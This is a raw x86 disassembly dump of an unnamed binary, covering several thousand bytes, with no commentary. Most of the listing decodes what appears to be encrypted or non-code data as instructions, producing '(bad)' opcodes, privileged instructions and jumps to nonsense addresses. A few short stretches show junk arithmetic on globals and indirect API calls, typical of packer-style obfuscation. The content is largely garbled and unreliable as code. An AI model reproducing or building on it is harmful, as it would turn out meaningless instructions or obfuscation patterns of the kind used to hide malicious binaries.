  417cfd:	cwde   
  417cfe:	push   esp
  417cff:	dec    eax
  417d00:	imul   ebp,DWORD PTR [eax],0x5770f6a3
  417d06:	retf   
  417d07:	pop    ebp
  417d08:	or     DWORD PTR [esi],esp
  417d0a:	pop    edi
  417d0b:	dec    esi
  417d0c:	mov    edi,0x596e8baf
  417d11:	mov    dl,0xe
  417d13:	fs mov esp,0xb0f1ab6c
  417d19:	jmp    0x9c920d4a
  417d1e:	add    bh,BYTE PTR [ebp+edi*8+0x18294781]
  417d25:	ins    BYTE PTR es:[edi],dx
  417d26:	push   edi
  417d27:	mov    ebx,0x7e6aeea3
  417d2c:	icebp  
  417d2d:	pusha  
  417d2e:	(bad)  
  417d2f:	mov    cl,BYTE PTR [edx]
  417d31:	or     BYTE PTR [esi+edx*2+0x78],al
  417d35:	loope  0x417d33
  417d37:	pop    eax
  417d38:	cld    
  417d39:	and    ah,ch
  417d3b:	cwde   
  417d3c:	or     eax,0x2f21d0ec
  417d41:	xchg   edx,eax
  417d42:	out    dx,al
  417d43:	cmp    esp,eax
  417d45:	popf   
  417d46:	cdq    
  417d47:	xchg   edx,eax
  417d48:	pop    edi
  417d49:	mov    esp,DWORD PTR [esi+0x1c]
  417d4c:	outs   dx,DWORD PTR ds:[esi]
  417d4d:	sti    
  417d4e:	xlat   BYTE PTR ds:[ebx]
  417d4f:	xchg   ebp,eax
  417d50:	inc    ecx
  417d51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d52:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  417d54:	mov    ah,0x7d
  417d56:	push   ebp
  417d57:	dec    esp
  417d58:	xchg   ebx,eax
  417d59:	pop    es
  417d5a:	adc    ecx,DWORD PTR [eax+eax*1-0x54]
  417d5e:	das    
  417d5f:	xchg   ebx,eax
  417d60:	loop   0x417d31
  417d62:	aam    0x7e
  417d64:	adc    dl,BYTE PTR [esi-0x8]
  417d67:	scas   eax,DWORD PTR es:[edi]
  417d68:	adc    BYTE PTR [esp+edx*4-0x141bc1c8],0x9f
  417d70:	mov    esi,0x847a8edc
  417d75:	retf   
  417d76:	not    BYTE PTR [esi]
  417d78:	(bad)  
  417d79:	call   0x8ff5d048
  417d7e:	sar    ch,0x67
  417d81:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d83:	jle    0x417d99
  417d85:	(bad)
  417d88:	push   ebx
  417d89:	mov    edx,0x14eefd78
  417d8e:	cwde   
  417d8f:	mov    dh,0xb0
  417d91:	sub    edx,DWORD PTR [ecx-0x6a811e73]
  417d97:	inc    esp
  417d98:	push   cs
  417d99:	mov    ds:0x6b249a5c,al
  417d9e:	xchg   DWORD PTR [ebp-0x5da2020f],esi
  417da4:	push   esi
  417da5:	mov    fs,ebp
  417da7:	jmp    0xf263:0x6364a0a2
  417dae:	xor    al,0x24
  417db0:	push   es
  417db1:	jne    0x417d8f
  417db3:	sbb    eax,0x9bd51591
  417db8:	outs   dx,BYTE PTR ds:[esi]
  417db9:	shl    BYTE PTR [edi-0x7],cl
  417dbc:	mov    WORD PTR [edx-0x60874596],cs
  417dc2:	mov    eax,ds:0xf176422c
  417dc7:	aam    0x24
  417dc9:	mov    bh,0xdd
  417dcb:	push   ds
  417dcc:	xchg   dl,ah
  417dce:	and    eax,0xe61a3316
  417dd3:	fbld   TBYTE PTR [ebp+0x8]
  417dd6:	and    eax,0x94549e5
  417ddb:	push   ebp
  417ddc:	in     al,dx
  417ddd:	push   edi
  417dde:	jecxz  0x417de5
  417de0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417de1:	(bad)  
  417de2:	outs   dx,BYTE PTR ds:[esi]
  417de3:	je     0x417e56
  417de5:	(bad)
  417de8:	pop    esi
  417de9:	arpl   WORD PTR [eax],sp
  417deb:	iret   
  417dec:	jge    0x417e1e
  417dee:	jo     0x417d8f
  417df0:	aaa    
  417df1:	shl    BYTE PTR [edi+edx*8],1
  417df4:	dec    edi
  417df5:	ss jae 0xb3c784e5
  417dfc:	dec    ecx
  417dfd:	outs   dx,BYTE PTR ds:[esi]
  417dfe:	js     0x417dbf
  417e00:	les    edi,FWORD PTR [ecx]
  417e02:	int    0x27
  417e04:	std    
  417e05:	dec    edx
  417e06:	xchg   ecx,eax
  417e07:	xor    al,0x84
  417e09:	mov    eax,0xe9e9c487
  417e0e:	scas   eax,DWORD PTR es:[edi]
  417e0f:	xchg   esp,eax
  417e10:	(bad)  
  417e11:	(bad)  
  417e13:	(bad)  
  417e14:	dec    ebx
  417e15:	ss es jmp 0x735b4d60
  417e1c:	(bad)  
  417e1d:	pop    ecx
  417e1e:	inc    ebp
  417e1f:	sub    BYTE PTR [eax+0x62b11ed6],dh
  417e25:	push   ebx
  417e26:	and    al,0xc9
  417e28:	mov    ds:0x8983631b,al
  417e2d:	bound  edi,QWORD PTR [ebp+0x73595694]
  417e33:	popa   
  417e34:	pop    es
  417e35:	cmp    dh,BYTE PTR [ebp+0x30]
  417e38:	nop
  417e39:	gs inc ebx
  417e3b:	mov    ebp,0x4e1cc115
  417e40:	pop    ecx
  417e41:	pop    ss
  417e42:	icebp  
  417e43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e44:	call   0xd75fb52
  417e49:	jmp    0xc3ab:0x2d99fe48
  417e50:	call   0xfc22d69
  417e55:	push   ss
  417e56:	dec    edi
  417e57:	gs sbb eax,0xbdb18f11
  417e5d:	adc    BYTE PTR [esi-0x2],bl
  417e60:	addr16 jne 0x417e9f
  417e63:	fisub  DWORD PTR ds:0xd15628db
  417e69:	add    al,BYTE PTR [edx+edx*2]
  417e6c:	dec    esp
  417e6d:	ss mov esp,0x2f7fa64d
  417e73:	and    edi,DWORD PTR ds:0x305fc013
  417e79:	pop    es
  417e7a:	repnz dec eax
  417e7c:	nop
  417e7d:	push   ss
  417e7e:	pushf  
  417e7f:	ror    dh,cl
  417e81:	ret    
  417e82:	mov    esi,0x5b1df7db
  417e87:	cs or  edx,edx
  417e8a:	call   0x1921:0x880a8ec2
  417e91:	jae    0x417eb5
  417e93:	daa    
  417e94:	jmp    0x417ed4
  417e96:	fstp   TBYTE PTR [edi+0xf]
  417e99:	push   edi
  417e9a:	xor    BYTE PTR [eax-0x1b],al
  417e9d:	sub    DWORD PTR [eax],0x2a
  417ea0:	adc    eax,0xdf2c1167
  417ea5:	aad    0x8b
  417ea7:	rol    DWORD PTR [esi-0x7e220b30],cl
  417ead:	ret    0x1d46
  417eb0:	push   esp
  417eb1:	mov    edi,es
  417eb3:	inc    esp
  417eb4:	and    al,0x3c
  417eb6:	aad    0x63
  417eb8:	add    BYTE PTR [eax],al
  417eba:	mov    DWORD PTR ds:0x4283af,0x432b
  417ec4:	mov    DWORD PTR [esp+0x30],0x169
  417ecc:	mov    DWORD PTR [esp+0x28],0x101b
  417ed4:	mov    DWORD PTR [esp+0x10],0x6bec
  417edc:	mov    eax,DWORD PTR [esp+0x10]
  417ee0:	mov    ecx,DWORD PTR [esp+0x28]
  417ee4:	sub    DWORD PTR ds:0x428273,0x4282cb
  417eee:	imul   eax,ecx
  417ef1:	or     eax,0x7f7d
  417ef6:	xor    eax,0xcf336131
  417efb:	cmp    DWORD PTR ds:0x4283c3,0x0
  417f02:	mov    ecx,0x3c6
  417f07:	mov    ecx,0x355d
  417f0c:	mov    ecx,0x21c7
  417f11:	jmp    0x41834c
  417f16:	mov    DWORD PTR ds:0x4282bf,0x1cb6
  417f20:	mov    DWORD PTR ds:0x4283bb,0x6ca2
  417f2a:	cmp    DWORD PTR ds:0x4283c3,0x0
  417f31:	jge    0x417f5f
  417f37:	push   DWORD PTR [ebp-0x1c]
  417f3a:	push   DWORD PTR [ebp-0x10]
  417f3d:	call   DWORD PTR ds:0x428ec8
  417f43:	sub    DWORD PTR ds:0x428297,0x19df
  417f4d:	xor    ecx,DWORD PTR ds:0x42827b
  417f53:	mov    ecx,DWORD PTR ds:0x4282db
  417f59:	and    DWORD PTR ds:0x4281d7,ecx
  417f5f:	xor    ecx,DWORD PTR ds:0x4283b3
  417f65:	mov    ecx,DWORD PTR ds:0x4281c7
  417f6b:	or     DWORD PTR ds:0x42835b,ecx
  417f71:	mov    ecx,DWORD PTR ds:0x4283df
  417f77:	or     DWORD PTR ds:0x4282c7,ecx
  417f7d:	jmp    0x41834c
  417f82:	jp     0x417fbc
  417f84:	lock adc al,0x9b
  417f87:	dec    esp
  417f88:	pop    edx
  417f89:	push   ds
  417f8a:	dec    esp
  417f8b:	retf   
  417f8c:	repnz push 0x21
  417f8f:	imul   esi,eax,0xffffffbe
  417f92:	push   ebx
  417f93:	fst    DWORD PTR [esi]
  417f95:	sbb    BYTE PTR [edx+edx*1-0x6d9ee7e8],bh
  417f9c:	imul   edi,eax,0xffffffc8
  417f9f:	jb     0x417f75
  417fa1:	fisttp QWORD PTR [esi-0x79eae4f3]
  417fa7:	cmp    bh,ah
  417fa9:	int3   
  417faa:	jo     0x41800f
  417fac:	jno    0x417f9f
  417fae:	jmp    0x3ea6b19d
  417fb3:	sbb    DWORD PTR [ecx-0x5e273c07],ebp
  417fb9:	pushf  
  417fba:	mov    ebp,cs
  417fbc:	fisubr WORD PTR [edi]
  417fbe:	xor    edx,DWORD PTR [ebx-0x2734a1a2]
  417fc4:	mov    ebp,0x5a77584
  417fc9:	aad    0xcb
  417fcb:	dec    edi
  417fcc:	adc    DWORD PTR [ebx-0x60],edx
  417fcf:	sar    BYTE PTR [ebx*1-0x685a190e],0x7c
  417fd7:	jle    0x417f91
  417fd9:	sub    DWORD PTR [eax+0xd],eax
  417fdc:	mov    esi,0x59c5d431
  417fe1:	mov    ecx,0x4cf7ac75
  417fe6:	loop   0x418030
  417fe8:	sub    BYTE PTR [ebp+0x8],al
  417feb:	and    dh,BYTE PTR [edx+0x65111759]
  417ff1:	mov    eax,ds:0xa795efa3
  417ff6:	adc    ebp,edx
  417ff8:	sub    BYTE PTR [edx-0x33],bh
  417ffb:	adc    ecx,ebp
  417ffd:	or     BYTE PTR [edx],ah
  417fff:	fimul  DWORD PTR [ecx+eiz*1]
  418002:	mov    ds:0xc6349b2b,eax
  418007:	dec    ecx
  418008:	cmp    al,al
  41800a:	addr16 inc eax
  41800c:	dec    esp
  41800d:	lahf   
  41800e:	sub    bh,al
  418010:	pop    ss
  418011:	add    DWORD PTR [ecx-0x77],0x692ec114
  418018:	mov    gs,WORD PTR [ebx+0xd1a77a5]
  41801e:	push   es
  41801f:	mov    ebx,DWORD PTR [ebp+0x2c463b1c]
  418025:	scas   al,BYTE PTR es:[edi]
  418026:	push   cs
  418027:	xor    BYTE PTR [ebp+0x6936b5ce],dh
  41802d:	mov    al,ds:0xc8a66f1f
  418032:	inc    ebx
  418033:	loope  0x418080
  418035:	clc    
  418036:	push   ds
  418037:	out    0x3a,eax
  418039:	push   ecx
  41803a:	pusha  
  41803b:	sbb    dh,dl
  41803d:	ret    0x6d79
  418040:	icebp  
  418041:	xchg   BYTE PTR [esi-0x2],bl
  418044:	add    al,0x51
  418046:	sbb    eax,0x19fdc47c
  41804b:	dec    eax
  41804c:	test   eax,0x9e5dbba5
  418051:	adc    eax,0x2ade4f71
  418056:	sub    eax,0x72f4c595
  41805b:	call   0xe9e43675
  418060:	test   al,0x47
  418062:	retf   0x84df
  418065:	add    al,0xa4
  418067:	sbb    ecx,DWORD PTR [ecx]
  418069:	xlat   BYTE PTR ds:[ebx]
  41806a:	ret    
  41806b:	out    dx,ax
  41806d:	mov    eax,ds:0x538f4710
  418072:	and    al,0xd3
  418074:	pop    esp
  418075:	int    0x6b
  418077:	std    
  418078:	mov    bh,0x2
  41807a:	push   ebx
  41807b:	clc    
  41807c:	mov    al,0x43
  41807e:	les    edx,FWORD PTR ds:[esi+0x44e68b7e]
  418085:	test   al,0x7f
  418087:	(bad)  
  418088:	pop    esp
  418089:	sbb    DWORD PTR [ebp+0x58333967],edi
  41808f:	imul   edx,edi,0xffffffc6
  418092:	mov    eax,ds:0xaecebd29
  418097:	popf   
  418098:	fdiv   QWORD PTR ds:0x9cdd49ed
  41809e:	fwait
  41809f:	xchg   esi,eax
  4180a0:	pop    eax
  4180a1:	pusha  
  4180a2:	(bad)  
  4180a3:	xchg   esp,eax
  4180a4:	sbb    edx,DWORD PTR [ebp+0x6a]
  4180a7:	nop
  4180a8:	xor    eax,0xb8113523
  4180ad:	arpl   WORD PTR [ecx],sp
  4180af:	or     esp,esi
  4180b1:	cmp    edx,edx
  4180b3:	xchg   ecx,eax
  4180b4:	pop    ebx
  4180b5:	in     eax,0xe0
  4180b7:	cmp    al,0x9c
  4180b9:	inc    esi
  4180ba:	bound  edi,QWORD PTR [esi-0x606d497e]
  4180c0:	rol    BYTE PTR [edi+0x25],1
  4180c3:	inc    esp
  4180c4:	xchg   edi,eax
  4180c5:	test   al,0xb2
  4180c7:	xchg   BYTE PTR [edi-0x5ae9617c],al
  4180cd:	mov    esp,0xe9f17c27
  4180d2:	mov    cl,0x19
  4180d4:	jmp    0x2153:0x4d5a6964
  4180db:	fs fcmovbe st,st(7)
  4180de:	sbb    dl,ah
  4180e0:	std    
  4180e1:	test   DWORD PTR [edi+0x6cfb7561],edi
  4180e7:	mov    BYTE PTR [edx+0x479ee776],0x68
  4180ee:	dec    edx
  4180ef:	fdiv   QWORD PTR [ebx]
  4180f1:	stos   DWORD PTR es:[edi],eax
  4180f2:	add    bh,BYTE PTR [esi+edi*4]
  4180f5:	cld    
  4180f6:	loope  0x4180ba
  4180f8:	cdq    
  4180f9:	repz add eax,0x89699738
  4180ff:	gs cld 
  418101:	(bad)  
  418102:	push   edi
  418103:	push   edx
  418104:	mov    bl,0xce
  418106:	mov    ah,0xb3
  418108:	inc    edi
  418109:	rcr    bl,1
  41810b:	xchg   BYTE PTR [edi+0x1f8ff449],bl
  418111:	bnd js 0x4180e9
  418114:	xor    eax,0x50786009
  418119:	mov    ds:0x95744d23,al
  41811e:	and    al,BYTE PTR [edi-0x313c4b26]
  418124:	retf   
  418125:	aaa    
  418126:	mov    ds:0x743f4bdb,al
  41812b:	and    eax,0x1955ddce
  418130:	xchg   edx,eax
  418131:	and    al,0xe6
  418133:	sub    cl,BYTE PTR [esi]
  418135:	inc    eax
  418136:	imul   ecx,esi,0x913517cb
  41813c:	(bad)  
  41813d:	data16 int 0x23
  418140:	push   es
  418141:	in     eax,dx
  418142:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418143:	push   eax
  418144:	stos   BYTE PTR es:[edi],al
  418145:	test   DWORD PTR [eax+0x50e093bd],ebx
  41814b:	dec    ecx
  41814c:	or     al,0x2d
  41814e:	xchg   ebx,eax
  41814f:	mov    gs,WORD PTR [ebx+edi*1+0x4c]
  418153:	lods   eax,DWORD PTR ds:[esi]
  418154:	jmp    0xae9c:0x8d8fae30
  41815b:	mov    ah,0x77
  41815d:	push   ebx
  41815e:	aam    0x4c
  418160:	or     eax,0x65517cda
  418165:	mov    edi,DWORD PTR [eax-0x3a0b57b1]
  41816b:	adc    cl,BYTE PTR [ebx]
  41816d:	(bad)  
  41816f:	jg     0x418140
  418171:	nop
  418172:	loopne 0x418191
  418174:	es stos DWORD PTR es:[edi],eax
  418176:	jb     0x41810a
  418178:	inc    ebx
  418179:	xor    al,0x11
  41817b:	push   eax
  41817c:	push   eax
  41817d:	(bad)  
  41817e:	daa    
  41817f:	into   
  418180:	sti    
  418181:	mov    bl,0xdb
  418183:	push   esi
  418184:	adc    BYTE PTR [edi],bl
  418186:	push   es
  418187:	outs   dx,BYTE PTR ds:[esi]
  418188:	or     edi,DWORD PTR ds:0x348a5e99
  41818e:	push   eax
  41818f:	sub    eax,0xba2e07fc
  418194:	jae    0x418121
  418196:	mov    dh,0x16
  418198:	sub    eax,0xce37f270
  41819d:	or     eax,0x774fc039
  4181a2:	ja     0x418125
  4181a4:	cmp    bl,BYTE PTR [eax]
  4181a6:	jae    0x4181d8
  4181a8:	lea    esp,[eax+0x1d]
  4181ab:	mov    ch,0xbd
  4181ad:	icebp  
  4181ae:	pop    ecx
  4181af:	fisttp WORD PTR [edi]
  4181b1:	push   0x94753670
  4181b6:	add    edi,DWORD PTR [esi]
  4181b8:	mov    edi,0x66461c07
  4181bd:	rcr    dh,0x15
  4181c0:	mov    ch,0x80
  4181c2:	retf   0x42e2
  4181c5:	mov    esp,esp
  4181c7:	and    ecx,DWORD PTR [edx]
  4181c9:	lock dec ebx
  4181cb:	ss adc eax,0xcad6a7b6
  4181d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4181d2:	js     0x41818d
  4181d4:	xchg   esi,eax
  4181d5:	jge    0x418197
  4181d7:	lods   eax,DWORD PTR ds:[esi]
  4181d8:	cmp    ecx,DWORD PTR [edx+0x4b]
  4181db:	dec    ebx
  4181dc:	jbe    0x4181d0
  4181de:	popa   
  4181df:	shl    DWORD PTR [ecx],1
  4181e1:	scas   al,BYTE PTR es:[edi]
  4181e2:	test   BYTE PTR [ebp+0x63a915a7],0x73
  4181e9:	jl     0x418216
  4181eb:	enter  0x8723,0xd
  4181ef:	cli    
  4181f0:	call   0xbeb5e81b
  4181f5:	sub    esi,esi
  4181f7:	or     BYTE PTR [edi],0xb
  4181fa:	dec    edx
  4181fb:	mov    al,ds:0x6a5e8531
  418200:	(bad)  
  418201:	pop    ds
  418202:	mov    al,0x20
  418204:	(bad)  
  418205:	jmp    0x4784:0x15e50854
  41820c:	sbb    BYTE PTR [ebp+0x5bf7a71],0x78
  418213:	loope  0x41824d
  418215:	push   edi
  418216:	inc    ebp
  418217:	push   esp
  418218:	mov    ds:0xf0dc4ef6,eax
  41821d:	jl     0x4181b2
  41821f:	sub    DWORD PTR [ebx+edx*4-0x4da58f39],esi
  418226:	and    DWORD PTR [edi-0x50],0x8b7b532a
  41822d:	jl     0x418211
  41822f:	mov    bl,0x9d
  418231:	lahf   
  418232:	lds    ebp,FWORD PTR [esi-0x20d808c0]
  418238:	mov    cl,0x51
  41823a:	or     al,0xb2
  41823c:	dec    ebx
  41823d:	mov    edx,0x882b3b3
  418242:	out    dx,eax
  418243:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418244:	fbstp  TBYTE PTR [ebp-0x41]
  418247:	sbb    DWORD PTR [ecx+esi*8+0x7a],0xc33e18ca
  41824f:	xchg   ebp,eax
  418250:	sbb    bh,0x40
  418253:	dec    edi
  418254:	out    dx,eax
  418255:	cmp    BYTE PTR [edx-0x16f1d779],ah
  41825b:	retf   
  41825c:	dec    esi
  41825d:	outs   dx,DWORD PTR ds:[esi]
  41825e:	fidivr DWORD PTR [eax+ebp*1]
  418262:	jle    0x418250
  418264:	fmulp  st(1),st
  418266:	jp     0x41828d
  418268:	cmp    al,BYTE PTR [edi-0x5a9c5f44]
  41826e:	bound  esp,QWORD PTR [ebx+ecx*4+0x5f]
  418272:	cld    
  418273:	mov    BYTE PTR [edi+0x40],bh
  418276:	adc    al,0xa0
  418278:	xor    esp,edx
  41827a:	scas   eax,DWORD PTR es:[edi]
  41827b:	inc    edx
  41827c:	adc    al,0xe6
  41827e:	fld    DWORD PTR [edx+ecx*1+0x13]
  418282:	pop    esp
  418283:	sub    al,0x15
  418285:	sbb    al,0x9e
  418287:	pop    esi
  418288:	dec    edi
  418289:	dec    esp
  41828a:	xchg   esp,eax
  41828b:	popa   
  41828c:	dec    edi
  41828d:	jne    0x418210
  41828f:	sbb    esp,esi
  418291:	retf   0x632e
  418294:	xchg   esi,eax
  418295:	aaa    
  418296:	cmp    eax,0xbc36a7a0
  41829b:	cmp    al,0xfd
  41829d:	nop
  41829e:	repz adc bh,dh
  4182a1:	mov    esp,0x27a58891
  4182a6:	call   0xb4686be
  4182ab:	addr16 adc eax,0x843a3494
  4182b1:	and    DWORD PTR [edx],esi
  4182b3:	xor    edx,eax
  4182b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4182b6:	iret   
  4182b7:	mov    ch,0x5f
  4182b9:	or     BYTE PTR [ebx],ch
  4182bb:	adc    al,0xa5
  4182bd:	es cmp ch,bh
  4182c0:	vmwrite edi,DWORD PTR [ecx+0x43]
  4182c4:	adc    al,al
  4182c6:	push   0x28
  4182c8:	daa    
  4182c9:	fist   WORD PTR [edx+0x38]
  4182cc:	inc    esi
  4182cd:	not    BYTE PTR [ecx]
  4182cf:	sbb    DWORD PTR [ebp-0x7c],edi
  4182d2:	jns    0x418262
  4182d4:	xor    edx,ebp
  4182d6:	cmp    dh,BYTE PTR [eax]
  4182d8:	pop    esi
  4182d9:	or     esp,DWORD PTR [ebx-0x2e]
  4182dc:	mov    esp,0xe938620f
  4182e1:	lods   al,BYTE PTR ds:[esi]
  4182e2:	test   eax,0x91d8a005
  4182e7:	inc    DWORD PTR [ecx]
  4182e9:	loop   0x41831d
  4182eb:	xor    BYTE PTR [esi-0x33],bl
  4182ee:	in     eax,0x27
  4182f0:	cmp    bh,BYTE PTR [eax-0x149a77bc]
  4182f6:	add    BYTE PTR [eax-0x2ff2ba29],0x40
  4182fd:	xor    dl,0x53
  418300:	or     BYTE PTR [ebp+0x7f],bl
  418303:	ror    DWORD PTR ds:0xd01f78e4,1
  418309:	push   ebx
  41830a:	sub    al,0xab
  41830c:	shr    DWORD PTR [ebx+0x35],0xbb
  418310:	test   al,0xf2
  418312:	es jae 0x4182e3
  418315:	and    eax,0xa2d9a574
  41831a:	jb     0x4182f4
  41831c:	push   ecx
  41831d:	sahf   
  41831e:	adc    DWORD PTR [edi+0x60357799],0x22
  418325:	add    al,0x52
  418327:	ins    BYTE PTR es:[edi],dx
  418328:	jmp    0xcf17569a
  41832d:	test   eax,0x70bca1d1
  418332:	mov    ebx,0x27dab2e0
  418337:	mov    eax,ds:0x833031b6
  41833c:	pop    es
  41833d:	mov    ecx,0xddace94c
  418342:	pop    es
  418343:	mov    eax,ds:0x3e2347d
  418348:	call   0xffa59e9d
  41834d:	xor    BYTE PTR [ebx-0x7ccbdbbc],cl
  418353:	cmp    eax,0x4281c7
  418358:	add    bh,al
  41835a:	add    eax,0x42828b
  41835f:	mov    BYTE PTR [edx+0x0],0x0
  418363:	mov    DWORD PTR ds:0x4283c7,edx
  418369:	mov    DWORD PTR ds:0x4281a3,0x1d0
  418373:	jmp    0x4183cc
  418378:	mov    DWORD PTR ds:0x4282c7,0x243f
  418382:	mov    DWORD PTR ds:0x42829f,0x6875
  41838c:	cmp    DWORD PTR ds:0x4281c7,0x0
  418393:	ja     0x4183ba
  418399:	push   0x36f9
  41839e:	push   0x428363
  4183a3:	push   0x488c
  4183a8:	call   DWORD PTR ds:0x428ecc
  4183ae:	add    DWORD PTR ds:0x42832f,ecx
  4183b4:	add    ecx,DWORD PTR ds:0x4282b3
  4183ba:	xor    DWORD PTR ds:0x428367,edx
  4183c0:	mov    ecx,DWORD PTR ds:0x428343
  4183c6:	or     DWORD PTR ds:0x4281bf,ecx
  4183cc:	add    eax,0x75d9
  4183d1:	xor    DWORD PTR ds:0x42826b,ebx
  4183d7:	push   0xd
  4183d9:	not    ecx
  4183db:	pop    ecx
  4183dc:	xor    edx,edx
  4183de:	div    ecx
  4183e0:	mov    ecx,DWORD PTR [esp+0x40]
  4183e4:	xor    edx,edx
  4183e6:	xor    DWORD PTR ds:0x42826f,0x4281db
  4183f0:	or     eax,ecx
  4183f2:	mov    ecx,DWORD PTR [esp+0x44]
  4183f6:	xor    DWORD PTR ds:0x4281cf,0x28c0
  418400:	or     eax,ecx
  418402:	movzx  ecx,WORD PTR ds:0x4283cf
  418409:	or     DWORD PTR ds:0x4283c7,ecx
  41840f:	mov    ecx,DWORD PTR [esp+0x9c]
  418416:	sub    DWORD PTR ds:0x42819f,0x428367
  418420:	div    ecx
  418422:	xor    edx,edx
  418424:	xor    eax,0x680da048
  418429:	cmp    DWORD PTR ds:0x42826b,0x0
  418430:	mov    DWORD PTR ds:0x42827b,0x43af
  41843a:	mov    ecx,0x1f20
  41843f:	jmp    0x418491
  418444:	mov    DWORD PTR ds:0x4283c3,0x5a59
  41844e:	cmp    DWORD PTR ds:0x42826b,0x0
  418455:	jl     0x41847f
  41845b:	push   0x4280c3
  418460:	push   0x400000
  418465:	call   DWORD PTR ds:0x428e28
  41846b:	sbb    DWORD PTR ds:0x4282af,0x4c8f
  418475:	mov    DWORD PTR ds:0x4281a7,0x386a
  41847f:	or     ecx,DWORD PTR ds:0x4283c3
  418485:	xor    ecx,DWORD PTR ds:0x42832b
  41848b:	or     ecx,0x6bea
  418491:	push   DWORD PTR [eax]
  418493:	mov    eax,DWORD PTR [esp+0x94]
  41849a:	or     DWORD PTR ds:0x4283c7,ecx
  4184a0:	mov    ecx,DWORD PTR [esp+0x5c]
  4184a4:	xor    DWORD PTR ds:0x42833f,0x4282ab
  4184ae:	push   DWORD PTR ds:0x4facd31
  4184b4:	add    eax,0xb4a
  4184b9:	and    DWORD PTR ds:0x4283e7,0x42826f
  4184c3:	push   DWORD PTR ds:0x1e6ebff7
  4184c9:	or     DWORD PTR ds:0x42833b,0x5053
  4184d3:	imul   eax,ecx
  4184d6:	push   DWORD PTR [eax-0x3f17647c]
  4184dc:	mov    eax,DWORD PTR [esp+0x60]
  4184e0:	adc    ecx,0x139f
  4184e6:	jmp    0x4188b5
  4184eb:	and    eax,0x8fa5979d
  4184f0:	sbb    esp,DWORD PTR [ebx]
  4184f2:	sbb    eax,0x7edf00c8
  4184f7:	stos   BYTE PTR es:[edi],al
  4184f8:	rcr    BYTE PTR [ebp+0x70],0xf6
  4184fc:	rcl    DWORD PTR [esi],1
  4184fe:	sbb    BYTE PTR [edx+edx*1-0x3ec8e7e8],bh
  418505:	and    DWORD PTR [esi],ebp
  418507:	lods   al,BYTE PTR ds:[esi]
  418508:	jge    0x41855a
  41850a:	sti    
  41850b:	sub    al,0x71
  41850d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41850e:	in     eax,dx
  41850f:	push   edi
  418510:	jo     0x418547
  418512:	clc    
  418513:	in     eax,0xbb
  418515:	sbb    al,dl
  418517:	mov    ch,bh
  418519:	and    esp,0x24
  41851c:	dec    esp
  41851d:	lods   al,BYTE PTR ds:[esi]
  41851e:	xchg   ecx,eax
  41851f:	adc    al,0x29
  418521:	int    0x12
  418523:	cmp    eax,0x8e267479
  418528:	mov    esi,0x4c4f7d46
  41852d:	and    al,0x69
  41852f:	jnp    0x418572
  418531:	cmp    DWORD PTR [edx-0x9],ebp
  418534:	add    BYTE PTR ds:0xc7624813,0x1b
  41853b:	lds    esp,FWORD PTR [esi+ecx*1+0x58]
  41853f:	fs ins DWORD PTR es:[edi],dx
  418541:	or     bl,BYTE PTR [ebp-0x30]
  418544:	dec    ebx
  418545:	(bad)  
  418546:	icebp  
  418547:	sbb    ch,BYTE PTR [edx-0x3b]
  41854a:	test   DWORD PTR [esi],ebx
  41854c:	dec    BYTE PTR [esi]
  41854e:	ret    0x62aa
  418551:	outs   dx,DWORD PTR ds:[esi]
  418552:	setg   cl
  418555:	sbb    ebx,DWORD PTR [edi+ebp*1-0x1a6ae181]
  41855c:	repz enter 0x255e,0xab
  418561:	sbb    DWORD PTR [ebx],eax
  418563:	test   BYTE PTR [edx+0x70a9c583],ch
  418569:	mov    ds:0x584ae76a,al
  41856e:	fabs   
  418570:	rol    DWORD PTR [ebp+0x57480fc4],cl
  418576:	shl    al,cl
  418578:	iret   
  418579:	sub    bl,BYTE PTR [eax]
  41857b:	gs mov al,0x8d
  41857e:	nop
  41857f:	sbb    DWORD PTR [eax-0x3],ecx
  418582:	ret    
  418583:	rcr    BYTE PTR [esi-0x2736007a],cl
  418589:	or     ecx,ecx
  41858b:	(bad)  
  41858c:	jg     0x418521
  41858e:	and    ebx,ebx
  418590:	not    BYTE PTR ds:0xf8e6ddc4
  418596:	fisubr WORD PTR [esi-0x67]
  418599:	(bad)  
  41859a:	xor    cl,ch
  41859c:	pop    eax
  41859d:	add    al,0x33
  41859f:	pusha  
  4185a0:	ins    DWORD PTR es:[edi],dx
  4185a1:	inc    esi
  4185a2:	das    
  4185a3:	push   edi
  4185a4:	out    dx,eax
  4185a5:	les    edi,FWORD PTR [ecx+0x27]
  4185a8:	(bad)  
  4185a9:	les    edi,FWORD PTR [eax-0x27]
  4185ac:	add    dh,ah
  4185ae:	stos   DWORD PTR es:[edi],eax
  4185af:	ins    BYTE PTR es:[edi],dx
  4185b0:	adc    cl,dh
  4185b2:	pusha  
  4185b3:	mov    esp,0x9471c8e1
  4185b8:	ins    BYTE PTR es:[edi],dx
  4185b9:	pop    edx
  4185ba:	(bad)  
  4185bb:	iret   
  4185bc:	hlt    
  4185bd:	inc    esi
  4185be:	or     al,0x6b
  4185c0:	dec    esp
  4185c1:	sub    ch,BYTE PTR [ebx-0xefc3a98]
  4185c7:	mov    dl,0xa6
  4185c9:	push   esp
  4185ca:	and    eax,0x8521792a
  4185cf:	(bad)  [esi-0xec2c2e5]
  4185d5:	push   esi
  4185d6:	pop    edi
  4185d7:	inc    ebx
  4185d8:	lock and eax,0xcd3fd98d
  4185de:	mov    ds:0xad37e10,al
  4185e3:	or     BYTE PTR [edi+0x68],0x4a
  4185e7:	jno    0x418639
  4185e9:	rcr    DWORD PTR [eax+0x71],0x24
  4185ed:	sbb    ch,BYTE PTR [esi+0x1d]
  4185f0:	or     al,0x37
  4185f2:	or     ebp,DWORD PTR ds:0xc23232c2
  4185f8:	add    edi,DWORD PTR [eax+0x17]
  4185fb:	sub    al,0x2c
  4185fd:	or     dh,BYTE PTR [edi]
  4185ff:	test   eax,0xb8b9f2dd
  418604:	jg     0x41864a
  418606:	cmp    al,0x6e
  418608:	ins    DWORD PTR es:[edi],dx
  418609:	dec    ebp
  41860a:	mov    ebp,0xf909278f
